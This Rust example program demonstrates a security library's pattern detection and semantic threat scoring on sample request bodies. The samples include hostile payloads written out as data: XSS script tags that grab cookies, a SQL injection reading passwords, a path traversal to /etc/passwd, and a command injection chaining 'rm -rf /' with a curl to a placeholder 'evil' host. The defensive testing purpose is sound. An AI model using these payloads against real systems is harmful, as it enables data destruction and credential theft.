use std::sync::Arc;
use std::time::Duration;

use guard_core_rs::detection_engine::{
    ContentPreprocessor, PatternCompiler, RegexFlags, SemanticAnalyzer,
};
use guard_core_rs::handlers::suspatterns::{CTX_REQUEST_BODY, SusPatternsManager};
use guard_core_rs::models::SecurityConfig;

async fn analyze_sample(
    manager: &Arc<SusPatternsManager>,
    preprocessor: &ContentPreprocessor,
    semantic: &SemanticAnalyzer,
    label: &str,
    content: &str,
) {
    println!("Sample: {label} ({} bytes)", content.len());

    let preview: String = content.chars().take(60).collect();
    println!("  raw preview        : {preview:?}");

    let processed = preprocessor.preprocess(content).await;
    let processed_preview: String = processed.chars().take(60).collect();
    println!(
        "  preprocessed       : {processed_preview:?} (len={})",
        processed.len()
    );

    let analysis = semantic.analyze(&processed);
    let threat_score = semantic.get_threat_score(&analysis);
    println!("  semantic threat    : {threat_score:.3}");
    if let Some(probs) = analysis.get("attack_probabilities") {
        println!("  attack probs       : {probs}");
    }
    if let Some(obf) = analysis.get("is_obfuscated") {
        println!("  is_obfuscated      : {obf}");
    }
    if let Some(layers) = analysis.get("encoding_layers") {
        println!("  encoding_layers    : {layers}");
    }

    let detection = manager
        .detect(content, "10.0.0.1", CTX_REQUEST_BODY, None)
        .await;
    println!(
        "  threat             : {} (score={:.3}, regex+semantic={} threats, time={:.3}ms)",
        detection.is_threat,
        detection.threat_score,
        detection.threats.len(),
        detection.execution_time * 1000.0
    );
    println!();
}

#[tokio::main]
async fn main() {
    println!("guard-core-rs: pattern_detection example");
    println!("----------------------------------------");

    let config = SecurityConfig::builder().build().expect("valid config");
    let manager = SusPatternsManager::arc(Some(&config));
    let semantic = SemanticAnalyzer::new();
    let preprocessor = ContentPreprocessor::new(10_000, true, None, None);

    let compiler = PatternCompiler::new(Duration::from_secs(5), 500);
    let custom = r"(?i)password\s*=\s*\w+";
    let compiled = compiler
        .compile_pattern(custom, RegexFlags::default_flags())
        .await
        .expect("compile custom pattern");
    println!(
        "Compiled ad-hoc pattern {custom:?}; matches {:?}",
        compiled.is_match("password=hunter2")
    );
    let (safe, reason) = compiler.validate_pattern_safety(custom, None);
    println!("Safety report for pattern      : safe={safe}, reason={reason:?}");
    println!();

    let samples = vec![
        ("benign json", "{\"user\":\"alice\",\"count\":42}".to_string()),
        (
            "reflective XSS",
            "<script>alert(document.cookie)</script>".to_string(),
        ),
        (
            "SQL injection",
            "1 UNION SELECT username,password FROM users --".to_string(),
        ),
        ("path traversal", "../../../../etc/passwd".to_string()),
        (
            "command injection",
            "id=1; rm -rf / && curl http://evil/".to_string(),
        ),
        (
            "url encoded XSS",
            "%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E".to_string(),
        ),
        (
            "mixed long payload",
            {
                let mut s = "regular prefix ".repeat(25);
                s.push_str("<iframe src=javascript:alert(1)>");
                s.push_str(&" harmless tail ".repeat(25));
                s
            },
        ),
    ];

    for (label, content) in &samples {
        analyze_sample(&manager, &preprocessor, &semantic, label, content).await;
    }

    let all_patterns = manager.get_all_patterns().await;
    println!(
        "SusPatternsManager reports {} built-in + custom regex pattern(s)",
        all_patterns.len()
    );
}
